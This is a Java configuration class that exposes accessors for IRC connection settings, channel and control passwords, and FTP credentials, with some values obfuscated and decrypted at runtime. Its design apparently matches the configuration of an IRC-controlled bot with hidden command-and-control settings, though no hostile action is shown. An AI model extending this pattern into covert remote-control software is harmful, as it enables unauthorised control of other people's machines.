package mn.num;


public class Config {
    public static boolean isClosing = false;

    public Config() {
    }

    public static String getSuffix() {
        return ConfigDeafaults.SUFFIX;
    }

    public static String getPrefix() {
        return ConfigDeafaults.PREFIX;
    }

    public static void setSuffix(String set) {
        ConfigDeafaults.SUFFIX = set;
    }

    public static void setPrefix(String set) {
        ConfigDeafaults.PREFIX = set;
    }

    public static void setIsClosing(boolean set) {
        isClosing = set;
    }

    public static boolean getIsClosing() {
        return isClosing;
    }

    public static String getConnect() {
        if (ConfigDeafaults.CONNECT.contains(" ")) return Misc.decrypt(ConfigDeafaults.CONNECT);
        else return ConfigDeafaults.CONNECT;
    }

    public static String getPort() {
        if (ConfigDeafaults.PORT.contains(" ")) return Misc.decrypt(ConfigDeafaults.PORT);
        else return ConfigDeafaults.PORT;
    }

    public static String getNick() {
        return (new StringBuilder(getPrefix())).append(ConfigDeafaults.NICK).append(getSuffix()).toString();
    }

    public static void setNick(String newNick) {
        ConfigDeafaults.NICK = (new StringBuilder(getPrefix())).append(newNick).append(getSuffix()).toString();
    }

    public static String getChannel() {
        if (ConfigDeafaults.CHANNEL.contains(" ")) return Misc.decrypt(ConfigDeafaults.CHANNEL);
        else return ConfigDeafaults.CHANNEL;
    }

    public static String getInputChannel() {
        if (ConfigDeafaults.INPUT_CHANNEL.contains(" ")) return Misc.decrypt(ConfigDeafaults.INPUT_CHANNEL);
        else return ConfigDeafaults.INPUT_CHANNEL;
    }

    public static String getOutputChannel() {
        if (ConfigDeafaults.OUTPUT_CHANNEL.contains(" ")) return Misc.decrypt(ConfigDeafaults.OUTPUT_CHANNEL);
        else return ConfigDeafaults.OUTPUT_CHANNEL;
    }

    public static String getOutputChannelPassword() {
        if (ConfigDeafaults.OUTPUT_CHANNEL_PASSWORD.contains(" "))
            return Misc.decrypt(ConfigDeafaults.OUTPUT_CHANNEL_PASSWORD);
        else return ConfigDeafaults.OUTPUT_CHANNEL_PASSWORD;
    }

    public static String getInputChannelPassword() {
        if (ConfigDeafaults.INPUT_CHANNEL_PASSWORD.contains(" "))
            return Misc.decrypt(ConfigDeafaults.INPUT_CHANNEL_PASSWORD);
        else return ConfigDeafaults.INPUT_CHANNEL_PASSWORD;
    }

    public static String getControlPassword() {
        if (ConfigDeafaults.CONTROL_PASSWORD.contains(" ")) return Misc.decrypt(ConfigDeafaults.CONTROL_PASSWORD);
        else return ConfigDeafaults.CONTROL_PASSWORD;
    }

    public static String getFtpUser() {
        return ConfigDeafaults.FTP_USER;
    }

    public static String getFtpPassword() {
        return ConfigDeafaults.FTP_PASSWORD;
    }

    public static String getFtpHost() {
        return ConfigDeafaults.FTP_HOST;
    }

    public static String getDirLoc() {
        return ConfigDeafaults.DIR_LOC;
    }

    public static String getSite() {
        return ConfigDeafaults.SITE;
    }
}